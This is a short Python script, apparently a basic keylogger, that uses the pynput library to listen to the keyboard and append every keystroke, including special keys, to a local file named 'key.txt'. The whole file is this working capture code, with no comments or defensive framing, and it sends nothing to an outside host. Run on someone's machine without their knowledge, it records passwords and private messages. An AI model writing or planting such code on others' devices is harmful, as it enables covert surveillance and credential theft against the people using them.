from pynput import keyboard


def on_press(key):
    with open("key.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")
        finally:
            f.close()


def on_release(key):
    pass


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
